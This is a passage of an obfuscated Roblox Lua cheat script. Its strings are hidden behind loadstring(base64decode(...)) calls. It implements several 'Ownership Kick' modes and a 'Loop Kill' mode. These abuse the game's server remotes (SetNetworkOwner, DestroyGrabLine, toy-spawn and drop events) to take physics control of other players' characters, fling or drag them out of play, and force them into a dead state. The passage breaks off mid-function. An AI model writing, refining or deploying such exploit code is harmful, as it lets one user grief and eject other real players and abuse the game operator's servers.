                        local tRoot = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        
                        if tRoot and tHum and tHum.Health > 0 and myRoot then
                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                cleanupBodies()
                                checkStartTime = 0
                                
                                pcall(function()
                                    tHum.PlatformStand = true
                                    tHum.Sit = true
                                    if GE:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()) then GE.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end
                                    if GE:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()) then GE.SetNetworkOwner:FireServer(tRoot, tRoot.CFrame) end
                                    if GE:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))()) then GE.DestroyGrabLine:FireServer(tRoot) end
                                end)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.15 then
                                    dragging = true
                                    grabStartTime = 0
                                    checkStartTime = tick()
                                    local lockPos = savedPos * CFrame.new(5, 20, 4)
                                    createBodies(tRoot, lockPos.Position)
                                end
                            else
                                myRoot.CFrame = savedPos
                                local lockPos = savedPos * CFrame.new(5, 20, 4)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if bodyPos and bodyPos.Parent then
                                    bodyPos.Position = lockPos.Position
                                    if bodyGyro then
                                        bodyGyro.CFrame = lockPos
                                    end
                                else
                                    createBodies(tRoot, lockPos.Position)
                                end
                                
                                tHum.PlatformStand = true
                                
                                pcall(function()
                                    if GE:FindFirstChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))()) and GE:FindFirstChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))()) then
                                        if currentFPS > 200 then
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        elseif currentFPS >= 155 and currentFPS <= 200 then
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        else 
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.SetNetworkOwner:FireServer(tRoot, lockPos)
                                            GE.DestroyGrabLine:FireServer(tRoot)
                                        end
                                    end
                                end)
                                
                                if checkStartTime > 0 and tick() - checkStartTime > 0.15 then
                                    local currentDist = (tRoot.Position - lockPos.Position).Magnitude
                                    
                                    if currentDist > 10 then
                                        dragging = false
                                        grabStartTime = 0
                                        checkStartTime = 0
                                        cleanupBodies()
                                        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                    else
                                        checkStartTime = tick()
                                    end
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                            checkStartTime = 0
                            cleanupBodies()
                        end
                        RunService.Heartbeat:Wait()
                    end
                    
                    cleanupBodies()
                    if myRoot then myRoot.CFrame = savedPos end
                    
                elseif mode == loadstring(base64decode("WG9jdSBVUEdSQURFRCBPd25lcnNoaXAgS2ljaw=="))() then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame 
                    local dragging = false
                    local grabStartTime = 0
                    local checkStartTime = 0
                    
                    local bodyPos = nil
                    local bodyGyro = nil

                    local function cleanupBodies()
                        pcall(function()
                            if bodyPos then bodyPos:Destroy() bodyPos = nil end
                            if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
                        end)
                    end

                    local function createBodies(targetRoot, pos)
                        cleanupBodies()
                        
                        for _, v in pairs(targetRoot:GetChildren()) do
                            if v:IsA(loadstring(base64decode("Qm9keVBvc2l0aW9u"))()) or v:IsA(loadstring(base64decode("Qm9keUd5cm8="))()) then
                                v:Destroy()
                            end
                        end
                        
                        bodyPos = Instance.new(loadstring(base64decode("Qm9keVBvc2l0aW9u"))())
                        bodyPos.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        bodyPos.D = 500
                        bodyPos.P = 100000
                        bodyPos.Position = pos
                        bodyPos.Parent = targetRoot
                        
                        bodyGyro = Instance.new(loadstring(base64decode("Qm9keUd5cm8="))())
                        bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
                        bodyGyro.D = 500
                        bodyGyro.P = 100000
                        bodyGyro.CFrame = CFrame.new(pos)
                        bodyGyro.Parent = targetRoot
                    end

                    while ownershipKickActive do
                        local currentTargetName = selectedPlrName or (selectedKickPlayer and selectedKickPlayer.Name)
                        local currentTarget = currentTargetName and Players:FindFirstChild(currentTargetName)
                        
                        if not currentTarget or not currentTarget.Character or not currentTarget.Parent then 
                            cleanupBodies()
                            break 
                        end
                        
                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tChar = currentTarget.Character
                        local tRoot = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        
                        if tRoot and tHum and tHum.Health > 0 and myRoot then
                            if not dragging then
                                myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                cleanupBodies()
                                checkStartTime = 0
                                
                                pcall(function()
                                    tHum.PlatformStand = true
                                    tHum.Sit = true
                                    SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                    SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                    DestroyGrabLine:FireServer(tRoot)
                                end)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if grabStartTime == 0 then grabStartTime = tick() end
                                if tick() - grabStartTime > 0.2 then
                                    dragging = true
                                    grabStartTime = 0
                                    checkStartTime = tick()
                                    local lockPos = savedPos * CFrame.new(5, 20, 4)
                                    createBodies(tRoot, lockPos.Position)
                                end
                            else
                                myRoot.CFrame = savedPos
                                local lockPos = savedPos * CFrame.new(5, 20, 4)
                                
                                myRoot.AssemblyLinearVelocity = Vector3.zero
                                myRoot.AssemblyAngularVelocity = Vector3.zero
                                
                                if bodyPos and bodyPos.Parent then
                                    bodyPos.Position = lockPos.Position
                                    if bodyGyro then
                                        bodyGyro.CFrame = lockPos
                                    end
                                else
                                    createBodies(tRoot, lockPos.Position)
                                end
                                
                                tHum.PlatformStand = true
                                
                                pcall(function()
                                    for xVec0uwV = 1, 4 do
                                        SetNetOwner:FireServer(tRoot, lockPos)
                                    end
                                    DestroyGrabLine:FireServer(tRoot)
                                end)
                                
                                if checkStartTime > 0 and tick() - checkStartTime > 0.2 then
                                    local currentDist = (tRoot.Position - lockPos.Position).Magnitude
                                    
                                    if currentDist > 15 then
                                        dragging = false
                                        grabStartTime = 0
                                        checkStartTime = 0
                                        cleanupBodies()
                                        myRoot.CFrame = tRoot.CFrame * CFrame.new(0, 0, 3)
                                    else
                                        checkStartTime = tick()
                                    end
                                end
                            end
                        else
                            dragging = false
                            grabStartTime = 0
                            checkStartTime = 0
                            cleanupBodies()
                        end
                        RunService.Heartbeat:Wait()
                    end
                    
                    cleanupBodies()
                    if myRoot then myRoot.CFrame = savedPos end
                    
                elseif mode == loadstring(base64decode("T3duZXJzaGlwIEtpY2sgZmFzdA=="))() then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame
                    local isGrabbing = false
                    local startTime = nil
                    local lastPalletTime = 0
                    local checkStartTime = nil
                    local grabAttemptStartTime = nil
                    local currentTargetRoot = nil
                    local attachments = {}

                    local spawnTask = task.spawn(function()
                        while ownershipKickActive and target and target.Parent do
                            local tChar = target.Character
                            local tRootActual = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if tRootActual then
                                pcall(function()
                                    SetNetOwner:FireServer(tRootActual, tRootActual.CFrame)
                                    tRootActual.AssemblyLinearVelocity = ZERO_VECTOR
                                    tRootActual.AssemblyAngularVelocity = ZERO_VECTOR
                                end)
                            end
                            task.wait(0.02)
                        end
                    end)
                    table.insert(ownershipKickConnections, spawnTask)

                    local function cleanupPhysicsObjects()
                        isGrabbing = false
                        currentTargetRoot = nil
                        for _, v in pairs(attachments) do
                            if v then pcall(function() v:Destroy() end) end
                        end
                        attachments = {}
                    end

                    local function isTargetAlive()
                        if not target or not target.Parent then return false end
                        local char = target.Character
                        if not char then return false end
                        local hum = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        if not hum or hum.Health <= 0 then return false end
                        local root = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not root then return false end
                        if root ~= currentTargetRoot then currentTargetRoot = root end
                        return true
                    end

                    local MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    local pallet = MyToys and MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
                    if not pallet and LocalPlayer.CanSpawnToy.Value then
                        pcall(function()
                            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(), HIDDEN_CF, Vector3.new(0, -90, 0))
                        end)
                        task.wait(0.5)
                        MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        pallet = MyToys and MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
                    end
                    local soundPart = pallet and pallet:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                    if not soundPart then
                        ownershipKickActive = false
                        return
                    end

                    while ownershipKickActive and target do
                        RunService.Stepped:Wait()
                        
                        if not isTargetAlive() then
                            cleanupPhysicsObjects()
                            local waitStart = tick()
                            while ownershipKickActive and target and tick() - waitStart < 0.5 do
                                if isTargetAlive() then break end
                                task.wait(0.1)
                            end
                            if not isTargetAlive() then
                                savedPos = myRoot.CFrame
                                startTime = nil
                                grabAttemptStartTime = nil
                                checkStartTime = nil
                            end
                            task.wait(0.1)
                            continue
                        end

                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not myRoot then 
                            task.wait()
                            continue 
                        end
                        
                        local tChar = target.Character
                        local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local tRoot = currentTargetRoot

                        if tRoot then
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            local limbs = {loadstring(base64decode("TGVmdCBMZWc="))(), loadstring(base64decode("UmlnaHQgTGVn"))(), loadstring(base64decode("TGVmdCBBcm0="))(), loadstring(base64decode("UmlnaHQgQXJt"))(), loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TG93ZXJUb3Jzbw=="))()}
                            for _, limbName in ipairs(limbs) do
                                local part = tChar:FindFirstChild(limbName)
                                if part then 
                                    part.Velocity = ZERO_VECTOR 
                                    part.RotVelocity = ZERO_VECTOR 
                                    part.CanCollide = false 
                                end
                            end
                        end

                        if not isGrabbing then
                            myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -6, -10)
                            myRoot.Velocity = ZERO_VECTOR
                            if not grabAttemptStartTime then grabAttemptStartTime = tick() end
                            tHum.PlatformStand = true
                            tHum.Sit = false
                            if not startTime then startTime = tick() end
                            if tick() - startTime > 0.05 then
                                isGrabbing = true
                                startTime = nil
                                grabAttemptStartTime = nil
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                
                                local att0 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), tRoot)
                                local att1 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), myRoot)
                                att1.CFrame = CFrame.new(0, 12, 0)
                                
                                local ap = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))(), tRoot)
                                ap.Attachment0 = att0 
                                ap.Attachment1 = att1
                                ap.MaxForce = math.huge 
                                ap.MaxVelocity = math.huge
                                ap.Responsiveness = 200 
                                ap.ApplyAtCenterOfMass = true
                                
                                local ao = Instance.new(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))(), tRoot)
                                ao.Attachment0 = att0 
                                ao.Attachment1 = att1
                                ao.MaxTorque = math.huge 
                                ao.Responsiveness = 200
                                
                                attachments.att0 = att0 
                                attachments.att1 = att1
                                attachments.ap = ap 
                                attachments.ao = ao
                                tHum:ChangeState(Enum.HumanoidStateType.Physics)
                            end
                        else
                            if attachments.att1 then 
                                attachments.att1.CFrame = CFrame.new(0, 16.5, 0) 
                            end
                            
                            if not isTargetAlive() then
                                cleanupPhysicsObjects()
                                savedPos = myRoot.CFrame
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                task.wait(0.1)
                                continue
                            end
                            
                            tRoot = currentTargetRoot
                            if not checkStartTime then checkStartTime = tick() + 0.25 end
                            if checkStartTime and tick() >= checkStartTime then
                                local currentDistance = (myRoot.Position - tRoot.Position).Magnitude
                                if currentDistance > 29 then
                                    cleanupPhysicsObjects()
                                    isGrabbing = false
                                    startTime = tick()
                                    grabAttemptStartTime = nil
                                    checkStartTime = nil
                                    savedPos = myRoot.CFrame
                                    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -8, 0)
                                    myRoot.Velocity = ZERO_VECTOR
                                    pcall(function()
                                        SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                        DestroyGrabLine:FireServer(tRoot)
                                    end)
                                    task.wait()
                                    continue
                                end
                            end
                            
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            
                            local currentTime = tick()
                            if currentTime - lastPalletTime >= 0.02 then
                                lastPalletTime = currentTime
                                soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                pcall(function()
                                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                                end)
                                task.wait()
                                soundPart.CFrame = HIDDEN_CF
                            end
                        end
                        task.wait()
                    end
                    
                    cleanupPhysicsObjects()
                    if myRoot and savedPos then 
                        myRoot.CFrame = savedPos 
                    end

                elseif mode == loadstring(base64decode("T3duZXJzaGlwIEtpY2sgRm9yIEV4cGxvaXRlcg=="))() then
                    local myChar = LocalPlayer.Character
                    local myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if not myRoot then
                        ownershipKickActive = false
                        return
                    end
                    
                    local savedPos = myRoot.CFrame
                    local isGrabbing = false
                    local startTime = nil
                    local lastPalletTime = 0
                    local checkStartTime = nil
                    local grabAttemptStartTime = nil
                    local currentTargetRoot = nil
                    local attachments = {}

                    local spawnTask = task.spawn(function()
                        while ownershipKickActive and target and target.Parent do
                            local tChar = target.Character
                            local tRootActual = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                            if tRootActual then
                                pcall(function()
                                    SetNetOwner:FireServer(tRootActual, tRootActual.CFrame)
                                    tRootActual.AssemblyLinearVelocity = ZERO_VECTOR
                                    tRootActual.AssemblyAngularVelocity = ZERO_VECTOR
                                end)
                            end
                            task.wait(0.011)
                        end
                    end)
                    table.insert(ownershipKickConnections, spawnTask)

                    local function cleanupPhysicsObjects()
                        isGrabbing = false
                        currentTargetRoot = nil
                        for _, v in pairs(attachments) do
                            if v then pcall(function() v:Destroy() end) end
                        end
                        attachments = {}
                    end

                    local function isTargetAlive()
                        if not target or not target.Parent then return false end
                        local char = target.Character
                        if not char then return false end
                        local hum = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        if not hum or hum.Health <= 0 then return false end
                        local root = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not root then return false end
                        if root ~= currentTargetRoot then currentTargetRoot = root end
                        return true
                    end

                    local MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    local pallet = MyToys and MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
                    if not pallet and LocalPlayer.CanSpawnToy.Value then
                        pcall(function()
                            ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(), HIDDEN_CF, Vector3.new(0, -90, 0))
                        end)
                        task.wait(0.5)
                        MyToys = Workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        pallet = MyToys and MyToys:FindFirstChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))())
                    end
                    local soundPart = pallet and pallet:FindFirstChild(loadstring(base64decode("U291bmRQYXJ0"))())
                    if not soundPart then
                        ownershipKickActive = false
                        return
                    end

                    while ownershipKickActive and target do
                        task.wait(0.0010416666666667)
                        
                        if not isTargetAlive() then
                            cleanupPhysicsObjects()
                            local waitStart = tick()
                            while ownershipKickActive and target and tick() - waitStart < 0.5 do
                                if isTargetAlive() then break end
                                task.wait(0.1)
                            end
                            if not isTargetAlive() then
                                savedPos = myRoot.CFrame
                                startTime = nil
                                grabAttemptStartTime = nil
                                checkStartTime = nil
                            end
                            task.wait(0.1)
                            continue
                        end

                        myChar = LocalPlayer.Character
                        myRoot = myChar and myChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if not myRoot then 
                            task.wait()
                            continue 
                        end
                        
                        local tChar = target.Character
                        local tHum = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local tRoot = currentTargetRoot

                        if tRoot then
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                RunService.Stepped:Wait(0)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            local limbs = {loadstring(base64decode("TGVmdCBMZWc="))(), loadstring(base64decode("UmlnaHQgTGVn"))(), loadstring(base64decode("TGVmdCBBcm0="))(), loadstring(base64decode("UmlnaHQgQXJt"))(), loadstring(base64decode("SGVhZA=="))(), loadstring(base64decode("VG9yc28="))(), loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), loadstring(base64decode("TG93ZXJUb3Jzbw=="))()}
                            for _, limbName in ipairs(limbs) do
                                local part = tChar:FindFirstChild(limbName)
                                if part then 
                                    part.Velocity = ZERO_VECTOR 
                                    part.RotVelocity = ZERO_VECTOR 
                                    part.CanCollide = false 
                                end
                            end
                        end

                        if not isGrabbing then
                            myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -6, -10)
                            myRoot.Velocity = ZERO_VECTOR
                            if not grabAttemptStartTime then grabAttemptStartTime = tick() end
                            tHum.PlatformStand = true
                            tHum.Sit = false
                            if not startTime then startTime = tick() end
                            if tick() - startTime > 0.15 then
                                isGrabbing = true
                                startTime = nil
                                grabAttemptStartTime = nil
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                
                                local att0 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), tRoot)
                                local att1 = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), myRoot)
                                att1.CFrame = CFrame.new(0, 12, 0)
                                
                                local ap = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))(), tRoot)
                                ap.Attachment0 = att0 
                                ap.Attachment1 = att1
                                ap.MaxForce = math.huge 
                                ap.MaxVelocity = math.huge
                                ap.Responsiveness = 400
                                ap.ApplyAtCenterOfMass = true
                                
                                local ao = Instance.new(loadstring(base64decode("QWxpZ25PcmllbnRhdGlvbg=="))(), tRoot)
                                ao.Attachment0 = att0 
                                ao.Attachment1 = att1
                                ao.MaxTorque = math.huge 
                                ao.Responsiveness = 400
                                
                                attachments.att0 = att0 
                                attachments.att1 = att1
                                attachments.ap = ap 
                                attachments.ao = ao
                                tHum:ChangeState(Enum.HumanoidStateType.Physics)
                            end
                        else
                            if attachments.att1 then 
                                attachments.att1.CFrame = CFrame.new(0, 16.5, 0) 
                            end
                            
                            if not isTargetAlive() then
                                cleanupPhysicsObjects()
                                savedPos = myRoot.CFrame
                                myRoot.CFrame = savedPos
                                myRoot.Velocity = ZERO_VECTOR
                                task.wait(0.1)
                                continue
                            end
                            
                            tRoot = currentTargetRoot
                            if not checkStartTime then checkStartTime = tick() + 0.25 end
                            if checkStartTime and tick() >= checkStartTime then
                                local currentDistance = (myRoot.Position - tRoot.Position).Magnitude
                                if currentDistance > 29 then
                                    cleanupPhysicsObjects()
                                    isGrabbing = false
                                    startTime = tick()
                                    grabAttemptStartTime = nil
                                    checkStartTime = nil
                                    savedPos = myRoot.CFrame
                                    myRoot.CFrame = tRoot.CFrame * CFrame.new(0, -8, 0)
                                    myRoot.Velocity = ZERO_VECTOR
                                    pcall(function()
                                        SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                        DestroyGrabLine:FireServer(tRoot)
                                    end)
                                    task.wait()
                                    continue
                                end
                            end
                            
                            pcall(function()
                                SetNetOwner:FireServer(tRoot, tRoot.CFrame)
                                DestroyGrabLine:FireServer(tRoot)
                            end)
                            
                            local currentTime = tick()
                            if currentTime - lastPalletTime >= 0.01 then
                                lastPalletTime = currentTime
                                soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                pcall(function()
                                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                                end)
                                task.wait()
                                soundPart.CFrame = HIDDEN_CF
                            end
                        end
                        task.wait()
                    end
                    
                    cleanupPhysicsObjects()
                    if myRoot and savedPos then 
                        myRoot.CFrame = savedPos 
                    end
                end
            end)
        end
    })
end

do

    local modeOptions = {
        loadstring(base64decode("TG9vcCBLaWxs"))(),
        loadstring(base64decode("TG9vcCBCYW5hbmEgUmFnZG9sbA=="))(),
        loadstring(base64decode("TG9vcCBTbm93YmFsbA=="))()
    }

    local selectedKillMode = loadstring(base64decode("TG9vcCBLaWxs"))()
    local loopKillActive = false
    local loopKillTask = nil
    local loopKillConnections = {}

    local function cleanupConnections()
        for _, conn in ipairs(loopKillConnections) do
            pcall(function() conn:Disconnect() end)
        end
        loopKillConnections = {}
        if loopKillTask then
            task.cancel(loopKillTask)
            loopKillTask = nil
        end
        loopKillActive = false
        
        pcall(function()
            local cameraAnchor = getgenv().CameraAnchor
            if cameraAnchor and cameraAnchor.detach then
                cameraAnchor:detach()
            end
        end)
    end

    ChooseGroup:CreateDropdown({
        Name = loadstring(base64decode("U2VsZWN0IExvb3AgTW9kZQ=="))(),
        Items = modeOptions,
        Default = loadstring(base64decode("TG9vcCBLaWxs"))(),
        Callback = function(Value)
            selectedKillMode = Value
        end
    })

    ChooseGroup:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIExvb3A="))(),
        Default = false,
        Callback = function(Value)
            if not Value then
                cleanupConnections()
                return
            end

            if loopKillActive then
                cleanupConnections()
            end

            loopKillActive = Value

            if selectedKillMode == loadstring(base64decode("TG9vcCBLaWxs"))() then
                local KillHB = nil
                local HEIGHT_LIMIT = 100000
                local TELEPORT_OFFSET = Vector3.new(6, -18.5, 0)

                local CameraAnchor = {}
                CameraAnchor.__index = CameraAnchor
                function CameraAnchor.new() return setmetatable({}, CameraAnchor) end
                function CameraAnchor:attach(cf)
                    self:detach()
                    local p = Instance.new(loadstring(base64decode("UGFydA=="))())
                    p.Name = loadstring(base64decode("Q2FtZXJhQW5jaG9y"))()
                    p.Size = Vector3.new(0.2, 0.2, 0.2)
                    p.Transparency = 1
                    p.Anchored = true
                    p.CanCollide = false
                    p.CFrame = cf
                    p.Parent = workspace
                    self.part = p
                    local cam = workspace.CurrentCamera
                    cam.CameraType = Enum.CameraType.Custom
                    cam.CameraSubject = p
                end
                function CameraAnchor:detach()
                    if self.part then self.part:Destroy() self.part = nil end
                    local cam = workspace.CurrentCamera
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))()) then
                        cam.CameraSubject = char.Humanoid
                    else
                        cam.CameraType = Enum.CameraType.Custom
                    end
                end
                local cameraAnchor = CameraAnchor.new()
                getgenv().CameraAnchor = cameraAnchor

                local function isTooHigh(plr)
                    local c = plr.Character
                    local hrp = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    return not hrp or hrp.Position.Y > HEIGHT_LIMIT
                end

                local function setNoCollideChar(char)
                    for _, v in ipairs(char:GetDescendants()) do
                        if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then v.CanCollide = false end
                    end
                end

                local function saveOriginalPos()
                    local char = LocalPlayer.Character
                    local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                    if hrp then char:SetAttribute(loadstring(base64decode("T3JpZ2luYWxQb3NpdGlvbg=="))(), hrp:GetPivot()) end
                end

                local function getOriginalPos()
                    local char = LocalPlayer.Character
                    return char and char:GetAttribute(loadstring(base64decode("T3JpZ2luYWxQb3NpdGlvbg=="))()) or nil
                end

                local function scheduleReturnHome()
                    local originalPos = getOriginalPos()
                    if not originalPos then return end
                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local char = LocalPlayer.Character
                        local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if hrp then
                            hrp:PivotTo(originalPos)
                            if getgenv().originalFallenHeight then
                                workspace.FallenPartsDestroyHeight = getgenv().originalFallenHeight
                            end
                            char:SetAttribute(loadstring(base64decode("U2F2aW5nT3JpZ2luYWxQb3M="))(), false)
                        end
                        cameraAnchor:detach()
                        conn:Disconnect()
                    end)
                end

                local function findBlobman()
                    local toys = workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                    return toys and toys:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))()) or nil
                end

                local function ensureBlobman()
                    local b = findBlobman()
                    if b then return b end
                    ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                        loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))(),
                        LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5),
                        Vector3.new(0, -15, 0)
                    )
                    for _ = 1, 30 do
                        task.wait(0.1)
                        b = findBlobman()
                        if b then return b end
                    end
                    return nil
                end

                local function modifyTarget(root, hum)
                    if not (root and hum) or hum.Health <= 0 then return end
                    local blob = ensureBlobman()
                    if blob and blob:FindFirstChild(loadstring(base64decode("QmxvYm1hblNlYXRBbmRPd25lclNjcmlwdA=="))()) then
                        local drop = blob.BlobmanSeatAndOwnerScript:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVEcm9w"))())
                        if drop then
                            for _, part in ipairs(hum.Parent:GetDescendants()) do
                                if part:IsA(loadstring(base64decode("V2VsZA=="))()) or part:IsA(loadstring(base64decode("QmFsbFNvY2tldENvbnN0cmFpbnQ="))()) then
                                    drop:FireServer(part, part)
                                end
                            end
                        end
                    end
                    hum.Sit = false
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)

                    local plr = Players:GetPlayerFromCharacter(hum.Parent)
                    if plr and plr:FindFirstChild(loadstring(base64decode("SXNIZWxk"))()) then plr.IsHeld.Value = false end
                    local rag = hum:FindFirstChild(loadstring(base64decode("UmFnZG9sbGVk"))())
                    if rag then rag.Value = false end

                    local bv = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
                    local bav = Instance.new(loadstring(base64decode("Qm9keUFuZ3VsYXJWZWxvY2l0eQ=="))())
                    bv.MaxForce = Vector3.new(1e7, -1e7, 1e7)
                    bv.P = 1e6
                    bv.Velocity = Vector3.new(math.random(-500, 50), -50, math.random(-50, 50))
                    bav.MaxTorque = Vector3.new(-1e7, -1e7, -1e7)
                    bav.P = 1e6
                    bav.AngularVelocity = Vector3.new(math.random(-500, 300), math.random(-300, 300), math.random(-500, 500))
                    bv.Parent = root
                    bav.Parent = root
                    hum.BreakJointsOnDeath = false
                    hum:ChangeState(Enum.HumanoidStateType.Dead)
                    task.delay(2, function()
                        if bv.Parent then bv:Destroy() end
                        if bav.Parent then bav:Destroy() end
                    end)
                end

                local function performKill()
                    if not selectedKickPlayer then return end
                    local target = selectedKickPlayer
                    local tChar = target and target.Character
